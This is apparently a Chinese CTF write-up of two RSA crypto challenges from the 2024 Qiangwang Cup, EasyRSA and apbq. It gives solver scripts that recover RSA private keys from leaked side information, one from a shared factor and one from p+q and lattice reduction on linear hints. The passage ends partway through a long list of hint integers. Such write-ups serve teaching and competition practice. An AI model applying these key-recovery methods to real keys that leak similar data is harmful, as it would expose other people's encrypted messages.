    <content type="html"><![CDATA[<p>前言：劳累了两天也估计没捞到强网先锋，明年不组校队了，和好基友一起打，下面是写出来的wp.</p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h2><h3 id="easyrsa"><a class="markdownIt-Anchor" href="#easyrsa"></a> EasyRSA</h3><p>原题，参考链接<a href="https://github.com/f61d/challenges/tree/d7982b92088b0721a7e5d39e8b435eef342f0a43/crypto/RSA/huwangbei2019_Crypto1">challenges/crypto/RSA/huwangbei2019_Crypto1 at d7982b92088b0721a7e5d39e8b435eef342f0a43 · f61d/challenges (github.com)</a></p><p>注意nc之后不要再懂否则数据会变，由于脚本的时间运行过长，多r和s进行微调调高以便于减少运行时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, long_to_bytes<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> mpz, iroot, powmod, invert<br><br><span class="hljs-comment"># Provided values</span><br>N = mpz(<span class="hljs-string">&quot;40243990750505497447119142724918508972023685002193535538925760185989269927009265000583179882394443707044670688673652061931766921349484426157243156835486688548875749087088026581541072488848092015916025933065059849550314913033019288477073327244531196592854069085805327970344647016765805696481717994683690079970704294081304537391703486185586123305900589487013532770363339123982194285472260226599714380834737734831803394319517973274426589122168509213280556395497691572258350542074078214554135885657306218192721380426141235733006953294820536454789760819681428380026752390441999199897667266789774009477790578221035241495223&quot;</span>)<br>e = <span class="hljs-number">65537</span><br>g = mpz(<span class="hljs-string">&quot;2109787150090953312235258678723810207880972377036785180914519474837393008384555651457057572424765037173210203914801783492968832699583987773593729839133&quot;</span>)<br>C = mpz(<span class="hljs-string">&quot;21367441924425943839427841815099770728458770984710300834938651458288050916725744832023227264230427506705418772127446511483114733491183841845986531951409518716090859928426501514127346180854292883087878456598016288947496534594729349810906081177522538491209502469962042951737021249010035528081936674593051128324637232682623256981914449754786277635703191383286273667678072503225909037676914214413782915159979917233501531513418963203473525987305943396381784093386990402243188486176237327343832978841189599882411519738343310114913787323675742837640617185796511242848657116487554906156968767194839181988504167335398586003891&quot;</span>)<br><br><span class="hljs-comment"># Calculate h, u, and v</span><br>h = (N - <span class="hljs-number">1</span>) // g<br>u = h // g<br>v = h % g<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Solve_c</span>():<br>    sqrt_N = iroot(N, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>    C_approx = sqrt_N // (g * g)<br><br>    a = <span class="hljs-number">2</span><br>    b = powmod(a, g, N)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-built_in">int</span>(C_approx) + <span class="hljs-number">1</span>):<br>        D = (iroot(C_approx, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>) * i<br>        final = powmod(b, u, N)<br>        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5200</span>,<span class="hljs-built_in">int</span>(D)):<br>            <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3000</span>,<span class="hljs-built_in">int</span>(D)):<br>                <span class="hljs-keyword">if</span> powmod(b, r * D + s, N) == final:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Solution found: r=<span class="hljs-subst">&#123;r&#125;</span>, s=<span class="hljs-subst">&#123;s&#125;</span>, i=<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">return</span> r * D + s<br><br><span class="hljs-comment"># Get the value of c</span><br>c = Solve_c()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c:&quot;</span>, c)<br><br><span class="hljs-comment"># Calculate A and B for quadratic equation</span><br>A = u - c<br>B = v + c * g<br><br><span class="hljs-comment"># Calculate the values of x and y</span><br>delta = iroot(B * B - <span class="hljs-number">4</span> * A, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>x = (B + delta) // <span class="hljs-number">2</span><br>y = (B - delta) // <span class="hljs-number">2</span><br><br>a = x // <span class="hljs-number">2</span><br>b = y // <span class="hljs-number">2</span><br><br><span class="hljs-comment"># Calculate p and q</span><br>p = <span class="hljs-number">2</span> * g * a + <span class="hljs-number">1</span><br>q = <span class="hljs-number">2</span> * g * b + <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Calculate private key exponent d</span><br>d = invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br><br><span class="hljs-comment"># Decrypt the ciphertext</span><br>m = powmod(C, d, N)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted message:&quot;</span>, long_to_bytes(m))<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/ezrsa.png" alt="ezrsa"></p><h3 id="apbq"><a class="markdownIt-Anchor" href="#apbq"></a> apbq</h3><p>第一阶段泄露了p+q的值，第二阶段泄露了100个形如ai<em>p + bi</em>q的等式,其中ai和bi是180位的随机整数，第三阶段泄露了两个等式:a<em>p + q和p + b</em>q,其中a和b是512位的随机整数。</p><p>第一阶段可以先使用韦达定理求解p和q,分别为较大和较小根，然后进行简单的验证，之后就是正常的计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes<br><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stage1_solver</span>(<span class="hljs-params">n, e, enc, p_plus_q</span>):<br>    b = p_plus_q  <span class="hljs-comment"># p + q</span><br>    c = n  <span class="hljs-comment"># p * q</span><br><br>    delta = b * b - <span class="hljs-number">4</span> * c<br><br>    p = (b + math.isqrt(delta)) // <span class="hljs-number">2</span><br>    q = (b - math.isqrt(delta)) // <span class="hljs-number">2</span><br><br>    <span class="hljs-comment"># Verify</span><br>    <span class="hljs-keyword">assert</span> p * q == n<br><br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>    d = inverse(e, phi)<br><br>    pt = <span class="hljs-built_in">pow</span>(enc, d, n)<br>    <span class="hljs-keyword">return</span> long_to_bytes(pt)<br><br>n = <span class="hljs-number">89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589</span><br>e = <span class="hljs-number">65537</span><br>p_plus_q = <span class="hljs-number">18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170</span><br>enc = <span class="hljs-number">23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247</span><br><br><span class="hljs-keyword">try</span>:<br>    flag = stage1_solver(n, e, enc, p_plus_q)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Decrypted flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到第一部分的flag</p><p>第二阶段提示中的整数列表，构造一个矩阵。每一行可以对应一个可能的 k 值和对应的加密消息。应用 LLL算法对矩阵进行基规约。寻找适合的线性组合，以确定合适的 kq用找到的 kq 值进行因子分解，以获得 RSA 的两个质数 p 和 q。随后可以算phi_n，利用已知的e和d进行计算，最后解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> Matrix<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_stage2</span>(<span class="hljs-params">hints, enc2</span>):<br>   <br>    n = <span class="hljs-number">73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819</span><br>    e = <span class="hljs-number">65537</span><br><br>    k = <span class="hljs-number">2</span> ** <span class="hljs-number">800</span><br>   <br>    V = hints[:<span class="hljs-number">4</span>]<br>    M = Matrix.column([k * v <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> V]).augment(Matrix.identity(<span class="hljs-built_in">len</span>(V)))<br>    B = [b[<span class="hljs-number">1</span>:] <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> M.LLL()]<br><br>    M = (k * Matrix(B[:<span class="hljs-built_in">len</span>(V) - <span class="hljs-number">2</span>])).T.augment(Matrix.identity(<span class="hljs-built_in">len</span>(V)))<br>    B = [b[-<span class="hljs-built_in">len</span>(V):] <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> M.LLL() <span class="hljs-keyword">if</span> <span class="hljs-built_in">set</span>(b[:<span class="hljs-built_in">len</span>(V) - <span class="hljs-number">2</span>]) == &#123;<span class="hljs-number">0</span>&#125;]<br><br>    <span class="hljs-comment"># 寻找合适的线性组合</span><br>    <span class="hljs-keyword">for</span> s, t <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(-<span class="hljs-number">2</span>, <span class="hljs-number">3</span>), repeat=<span class="hljs-number">2</span>):<br>        T = s * B[<span class="hljs-number">0</span>] + t * B[<span class="hljs-number">1</span>]<br>        a1, a2, a3, a4 = T<br>        kq = gcd(a1 * hints[<span class="hljs-number">1</span>] - a2 * hints[<span class="hljs-number">0</span>], n)<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">1</span> &lt; kq &lt; n:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;find!&#x27;</span>, kq, s, t)<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-comment"># 寻找q</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span> ** <span class="hljs-number">16</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> kq % i == <span class="hljs-number">0</span>:<br>            kq //= i<br>    q = <span class="hljs-built_in">int</span>(kq)<br>    p = <span class="hljs-built_in">int</span>(n // kq)<br><br>    <span class="hljs-comment"># 计算私钥和解密</span><br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>    d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)<br>    m = <span class="hljs-built_in">pow</span>(enc2, d, n)<br>    flag2 = long_to_bytes(<span class="hljs-built_in">int</span>(m)).decode()<br><br>    <span class="hljs-keyword">return</span> flag2, p, q, d<br><br>hints = [<span class="hljs-number">18167664006612887319059224902765270796893002676833140278828762753019422055112981842474960489363321381703961075777458001649580900014422118323835566872616431879801196022002065870575408411392402196289546586784096</span>, <span class="hljs-number">16949724497872153018185454805056817009306460834363366674503445555601166063612534131218872220623085757598803471712484993846679917940676468400619280027766392891909311628455506176580754986432394780968152799110962</span>, <span class="hljs-number">17047826385266266053284093678595321710571075374778544212380847321745757838236659172906205102740667602435787521984776486971187349204170431714654733175622835939702945991530565925393793706654282009524471957119991</span>, <span class="hljs-number">25276634064427324410040718861523090738559926416024529567298785602258493027431468948039474136925591721164931318119534505838854361600391921633689344957912535216611716210525197658061038020595741600369400188538567</span>, <span class="hljs-number">22620929075309280405649238349357640303875210864208854217420509497788451366132889431240039164552611575528102978024292550959541449720371571757925105918051653777519219003404406299551822163574899163183356787743543</span>, <span class="hljs-number">20448555271367430173134759139565874060609709363893002188062221232670423900235907879442989619050874172750997684986786991784813276571714171675161047891339083833557999542955021257408958367084435326315450518847393</span>, <span class="hljs-number">16581432595661532600201978812720360650490725084571756108685801024225869509874266586101665454995626158761371202939602347462284734479523136008114543823450831433459621095011515966186441038409512845483898182330730</span>, <span class="hljs-number">23279853842002415904374433039119754653403309015190065311714877060259027498282160545851169991611095505190810819508498176947439317796919177899445232931519714386295909988604042659419915482267542524373950892662544</span>, <span class="hljs-number">16542280976863346138933938786694562410542429842169310231909671810291444369775133082891329676227328401108505520149711555594236523078258701726652736438397249153484528439336008442771240980575141952222517324476607</span>, <span class="hljs-number">17054798687400834881313828738161453727952686763495185341649729764826734928113560289710721893874591843482763545781022050238655346441049269145400183941816006501187555169759754496609909352066732267489240733143973</span>, <span class="hljs-number">22115728663051324710538517987151446287208882441569930705944807337542411196476967586630373946539021184108542887796299661200933395031919501574357288914028686562763621166172668808524981253976089963176915686295217</span>, <span class="hljs-number">19324745002425971121820837859939938858204545496254632010818159347041222757835937867307372949986924646040179923481350854019113237172710522847771842257888083088958980783122775860443475680302294211764812636993025</span>, <span class="hljs-number">17269103712436870749511150569030640471982622900104490728908671745662264368118790999669887094371008536628103283985205839448583011077421205589315164079023370873380480423797655480624151812894997816254147210406492</span>, <span class="hljs-number">17365467616785968410717969747207581822018195905573214322728668902230086291926193228235744513285718494565736538060677324971757810325341657627830082292794517994668597521842723473167615388674219621483061095351780</span>, <span class="hljs-number">20823988964903136690545608569993429386847299285019716840662662829134516039366335014168034963190410379384987535117127797097185441870894097973310130525700344822429616024795354496158261293140438037100429185280939</span>, <span class="hljs-number">19068742071797863698141529586788871165176403351706021832743114499444358327620104563127248492878047796963678668578417711317317649158855864613197342671267006688211460724339403654215571839421451060657330746917459</span>, <span class="hljs-number">20089639597210347757891251257684515181178224404350699015820324544431016085980542703447257134320668961280907495580251880177990935443438799776252979843969984270461013888122703933975001704404129130156833542263882</span>, <span class="hljs-number">22344734326131457204500487243249860924828673944521980798994250859372628295695660076289343998351448667548250129358262592043131205967592613289260998148991388190917863322690137458448696392344738292233285437662495</span>, <span class="hljs-number">22688858027824961235755458925538246922604928658660170686458395195714455094516952026243659139809095639584746977271909644938258445835519951859659822660413616465736923822988993362023001205350387354001389518742538</span>, <span class="hljs-number">21286046487289796335501643195437352334100195831127922478044197411293510360710188581314023052580692810484251118253550837525637065385439859631494533102244585493243972819369812352385425700028640641292410326514111</span>, <span class="hljs-number">21542729548465815605357067072323013570796657575603676418485975214641398139843537820643982914302122976789859817102498484496409546012119998359943274203338400776158986205776474024356567247508744784200354385060666</span>, <span class="hljs-number">22319592382753357951626314613193901130171847776829835028715915533809475362288873045184870972146269975570664009921662023590318988850871708674240304838922536028975978222603171333743353770676344328056539379240160</span>, <span class="hljs-number">25195209191944761648246874631038407055240893204894145709996399690807569652160721616011712739214434932639646688187304865397816188999592774874989401871300784534538762135830014255425391132306536883804201055992313</span>, <span class="hljs-number">18257804244956449160916107602212089869395886846990320452133193087611626919926796845263727422042179229606817439442521540784268169177331707314788427670112999551683927934427716554137597798283300120796277229509678</span>, <span class="hljs-number">20293403064916574136692432190836928681820834973375054705153628740577159076332283715581047503287766236543327123639746352358718218140738999496451259789097826888955418315455420948960832865750253988992454128969953</span>, <span class="hljs-number">15967654820584966012628708475666706277218484919923639492431538068059543232562431059752700377242326527417238151501168940191488179144049286512652111172149113549072003881460743035279388672984805823560897688895124</span>, <span class="hljs-number">25144187979876039024245879200325843092774389926620026124061775431569974232758799200333888039013494603721065709195353330350750055309315207499741437181094874894647736904055829877859906318073991986020178158776286</span>, <span class="hljs-number">15736932921640444103019961538951409924080453868073105830403926861058056351553271238438325117113945341892868641345117717666354739204401152657265824568724844930574396801692131746182948347887298330990039956813130</span>, <span class="hljs-number">18831072673439732764722762485733622234889447953507582396819704359771208236721692820362137219509611319088756045211407777880521726782697895768017460064889670066178710804124631128581556314122255564861269062385337</span>, <span class="hljs-number">23800437561684813552661749774840752013501533683948618798811470214669024646396165487093720960221009038817909066075238937189371227098032581450466402462014437421254375846263830927945343485988463525070074913720710</span>, <span class="hljs-number">24402191070622494792723290726249952159888270689258801831518209605331984684494095167423722682814769395395011136124403802097229547003802312444913008194461779426175966774202219703164060353710247619639616444797670</span>, <span class="hljs-number">20215481513831963554421686543560596857659844027486522940060791775984622049024173363533378455076109165728144576719015392033536498353094895564917644840994662704362121549525329105205514332808950206092190939931448</span>, <span class="hljs-number">18384453917605955747212560280232547481041600196031285084598132475801990710125754705645482436436531608696373462641765399622296314590071558616193035939108523357020287896879479452040171765916716377102454266933226</span>, <span class="hljs-number">21890401344164908103930010123434944359446535642544335610455613014563290097498740447164765588532234051104173227090428486681237432196639010849051113283297943367655458678533223039415083212229970648958070799280218</span>, <span class="hljs-number">18379893441293694747570620009241814202936873442370354246029979042247705730610190888710981918183390028386451290137755339890329474403224043675724851314770861939082447728194632548864823398818221526652331319263027</span>, <span class="hljs-number">18715827130228986951360013590464775001019026913384718876134449689773600060962392738619405370033085704046027397895627933844824630723286144367800484157574548819065406118338665931032779491897783504790669824301288</span>, <span class="hljs-number">13588739911708699123450670852772302012518315143187739886523841133752009403411431627334135210166268158490674049617489193734568451811305631563767138879895461211915128972052001136464325219117009268526575020143259</span>, <span class="hljs-number">18506039912943821193373920483847347155611306173368341979655092778147169768984477236224526786441466933360500418090210912574990962709452725122792963919616633389125605160796446674502416801964271004625701238202575</span>, <span class="hljs-number">22167985517547342184812919437069844889650448522260359154086923601900060998572245598167213217022051141570075284051615276464952346620430587694188548679895095556459804921016744713098882496174497693878187665372865</span>, <span class="hljs-number">21507363933875318987283059841465034113263466805329282129011688531718330888226928182985538861888698160675575993935166249701145994333840516459683763957425287811252135418288516497258724668090570720893589001392220</span>, <span class="hljs-number">20250321586608105267884665929443511322540360475552916143405651419034772061789298150974629817817611591100450468070842373341756704300393352252725859102426665187194754280129749402796746118608937061141768301995522</span>, <span class="hljs-number">16104259151024766025645778755951638093681273234415510444173981198301666343334808614748361662637508091511498829253677167171091582942780017355912433497214576425697459483727777273045993446283721290714044600814203</span>, <span class="hljs-number">14560242181138184594433372530956542527312169507277535425067427080573272033961044062335960097446781943943464713852520415535775461964590009720592053626735276833191667395201287169782350381649400286337671320581068</span>, <span class="hljs-number">16239347596615402699390026749150381714807445218767496868569282767673828662340774349530405347667558555781433774705139593469838946201218537641296949822639509296966092138954685186059819628696340121356660166937131</span>, <span class="hljs-number">21344472317634795288252811327141546596291633424850284492351783921599290478005814133560171828086405152298309169077585647189366292823613547973428250604674234857289341613448177246451956695700417432794886277704716</span>, <span class="hljs-number">16053809990112020217624905718566971288375815646771826941011489252522755953750669513046736360397030033178139614200701025268874379439106827823605937814395162011464610496629969260310816473733828751702925621950679</span>, <span class="hljs-number">18917855883623050190154989683327838135081813638430345099892537186954876489710857473326920009412778140451855952622686635694323466827034373114657023892484639238914593012175120540210780102536003758794571846502397</span>, <span class="hljs-number">22690171278715056779052233972642657173540399024770527983659216197108042021644328773010698851143953503599329885607621773816718008861742027388432534850163666629476315340137626681994316866368449548292328156728206</span>, <span class="hljs-number">21087818524872480052313215092436868441694786060866149491087132591272640372512484925209820065536439188250579925233059144898601140234767300574307770064543499923712729705795392684173268461519802573563186764326797</span>, <span class="hljs-number">18439753470094841291394543396785250736332596497190578058698960152415339036714664835925822942784700917586270640813663002161425694392259981974491535370706560550540525510875465091384383255081297963169390777475352</span>, <span class="hljs-number">20105719699015744146039374208926740159952318391171137544887868739518535254000803811729763681262304539724253518465850883904308979964535242371235415049403280585133993732946919550180260852767289669076362115454200</span>, <span class="hljs-number">17251599484976651171587511011045311555402088003441531674726612079301412643514474016351608797610153172169183504289799345382527665445027976807805594288914226822374523878290416047130731166794970645275146679838899</span>, <span class="hljs-number">23027331991437585896233907022469624030630702237261170259290872847355304456043379238362120518409085840638396736666056992747627271193089116095167049248270541979716594671069985183070290375121270398623215587207529</span>, <span class="hljs-number">18158149685496169798299129683009221264185608469410295069411669832919646968324946121757411511373498747604679198739125835462814352243797919744572086307939585501566092705355693015625009717017077302201663788208609</span>, <span class="hljs-number">18276153196656501517216055049560959047263892309902154534799806637704337317207294332426798932144785240877892837491213916540255237702169595754963908689566362060228840286531616263506272071630209104758589482803348</span>, <span class="hljs-number">19830654702835464289082520892939657653574451119898587213320188332842291005863699764597454403874285715252681820027919359194554863299385911740908952649966617784376852963552276558475217168696695867402522508290055</span>, <span class="hljs-number">15349828226638644963106414986240676364822261975534684137183044733508521003843559094515387144949811552173241406076270015291925943459603622043168219534080772937297911323165839870364550841685270125556125756627553</span>, <span class="hljs-number">20923687596111161976478930953796496927811701530608223491138786355445002217973253897724452954815797952200740069102515860924306246841340715110620719064010080520601890251137419840158983682372232110885549732743013</span>, <span class="hljs-number">21095748006022412831703352650023882351218414866517568822818298949510471554885207645049385966827210564667371665855668707424105040599599901165292360321667007968065708796593851653085339928947755081203265281357013</span>, <span class="hljs-number">20136320433636422315432754195821125224777716034031656342233368000257459497472596860252592531939146543685406198978058242599116859263546329669263543660114747385041549283367183026001454445297981439938401547228229</span>, <span class="hljs-number">16496919752274418275948572022974868132658743151124597724312835413857298109100258912203517423633396955060591787380445877361136405137884456764770035346437177846666365911942996404514058688909577420388537479730705</span>, <span class="hljs-number">13788728438272498164727737074811797093818033799836159894472736480763530670013682288670889124484670336660448907074673625466218166413315342420667608074179975422284472184048790475129281850298519112884101776426380</span>, <span class="hljs-number">24852871485448795332267345793743281093931161235481251209948049584749441451621572752080662697610253315331335180611651946374137068256112152253681972406000252076016099200912670370417045090034045383991812756120791</span>, <span class="hljs-number">18663346319122078996775762643035864683521213720864038756854558668694021987970601131985163948257100423991091156649638455828855082098689641225427227191064496066436196910238564311309556938903101074363279783438714</span>, <span class="hljs-number">21400068681031931459396470039651524575262457489792894764406364952394476440804779651233022862527636114968325782197380721095406628084183336358459476006267416033892771932528688312375109463803215034905281657962293</span>, <span class="hljs-number">16044158155847172030103761204572942507195578382208455423846603003318483484698088948486132040995746837257705704187725306831142305215342467016564452582165866039427184607605673304595194959499145031211096109534167</span>, <span class="hljs-number">16518253246325822837502418827700493807621067058438396395472266350036385535241769917459657069911028720968654253735107131282350340465691670072304718987805883113410923109703284511709226857412404454224134480632696</span>, <span class="hljs-number">22032469066601123287586507039704080058983969235246539501189720236880312024198451198788699002335010120658564926677243708367430773661097221076615953342733896063909953602379936312639192315223258556134958059637605</span>, <span class="hljs-number">17474611942177808070315948910226643697957069578572244709354155010512694059987765040746148981545760660371360975936526076852619987733316042847813177383519241505024635332293992920023420060610648140841369822739716</span>, <span class="hljs-number">20097265939024591617239874622716452182434300498447992668997438018575636772416262543204370899462096267444545094719202447520254303983442269757551626971917981420832391886214473318353984504467919530676605744560570</span>, <span class="hljs-number">18170251482705061226968041449812078923477452841162650888922564215790088545936753453513162197661916172215859504545409274440450807677845894292177296835154674774694992388033874349807244020099167681146357128785394</span>, <span class="hljs-number">18084007437523118129421476751918491055914528331902780911288404344016551650138679157754567938593688369062981279371320169939281882307797009116458871503759873023914718337944953764426183937635379280572434676575757</span>, <span class="hljs-number">17001811604221128900675671565539617923973183364469396458234914432162200119518252971721448274846235879320362924206656971472493711107677598961463553324277826426691784458674010708635756004550789902368338633272118</span>, <span class="hljs-number">20217009574515126619724139485885721324936960849401637840860565569588595992087537454744066905387396266844236387315004915383456736142307523960394594650088663019228826091309049211780607761862663242437656610298243</span>, <span class="hljs-number">25534440916970201550118006203706860249111087748000550226680885431006136131742280963090650607632467666558508520152535105122661615376298673454198064361094319699307084117001019115669670029195171047304283891069792</span>, <span class="hljs-number">18871869316294018605789169171879572816494092699556970507058691345095743053290043643010965660058888064972257990750611470141816041727746767146945121588515830427165739580791663951175220638901672353681640741068573</span>, <span class="hljs-number">20173968537913641339915058056878181363456579537994317562789857397928196160113042659777558550242315788417022891612723148843142958668959046890197219991727894451795438138592005695329607326086644956073759609743066</span>, <span class="hljs-number">20601943394990265144021144365970164017319737300436518536503270346147112565303361487668388700369636611354280332841812324530501569200031186584749278453651172121161814207025650519637781007286435981682228528706305</span>, <span class="hljs-number">16397528630087028144645213166977866073543422560337716097539091258081008408890966764995645782823950721804205427713461441138000880478364026137452291234097219085473748076681729365744710225699866258812642458184750</span>, <span class="hljs-number">21373350333568141000876969785296802670776508778278005158047105058430550665787088265486222905402690421155861103648370249249790560185790723042867282734693553039477436055775198037042047438047898227097749354619822</span>, <span class="hljs-number">17767469767416052322357795736899648760868316512079849340028040817353808899589201201338152114229279980849491049574543361275046276135253417685681262008211582060955974064559129311524323185960856955462761555353091</span>, <span class="hljs-number">22148352529815091269441663541923247974004854058764556809596705832663604786920964849725772666340437231503146814919702525852955831173047034475925578238466977606367380212886384487294569287202762127531620290162734</span>, <span class="hljs-number">21663842528026621741414050256553652815372885707031383713657826718944735177083300302064509342116651731671570591336596953911570477161536730982887182434407761036442993588590230296643001682944654490645815177777455</span>, <span class="hljs-number">20219077358929317461660881724990436334639078047412693497584358963241840513748365548465302817975329987854784305275832045889690022909383530837382543579292451297269623663257098458645056099201050578472103957851128</span>, <span class="hljs-number">18255302182526662903763852563401346841065939531070045000414364747445988455597258924280193695407035356029557886165605853810182770534711966292253269625917149411889979307227493949293798772727125069093642134972336</span>, <span class="hljs-number">24926064145128749429079117171467042019887257504329103038171762786986349157515552927216574990423327013202735544601170247730647598931030432792167867343343213411600516855009788294067588153504026267213013591793027</span>, <span class="hljs-number">22369607314724468760253123915374991621544992437057652340350735935680183705467064876346663859696919167243522648029531700630202188671406298533187087292461774927340821192866797400987231509211718089237481902671100</span>, <span class="hljs-number">16994227117141934754898145294760231694287000959561775153135582047697469327393472840046006353260694322888486978811557952926229613247229990658445756595259401269267528233642142950389040647504583683489067768144570</span>, <span class="hljs-number">21758885458682118428357134100118546351270408335845311063139309657532131159530485845186953650675925931634290182806173575543561250369768935902929861898597396621656214490429009706989779345367262758413050071213624</span>, <span class="hljs-number">20156282616031755826700336845313823798147854495428660743884481573484471099887576514309769978525225369254700468742981099548840277532978306665910844928986235042420698332201264764734685502001234369189521332392642</span>, <span class="hljs-number">23291765247744127414491614915358658114280269483384022733002965612273627987872443453777028006606037159079637857473229879140366385523633075816362547967658930666106914269093225208138749470566410361196451552322613</span>, <span class="hljs-number">19807792217079652175713365065361659318870738952921195173619551645956745050506271953949139230097128034416815169649874760890189515620232505703162831090225715453502422905418824316957257395992121750661389503495033</span>, <span 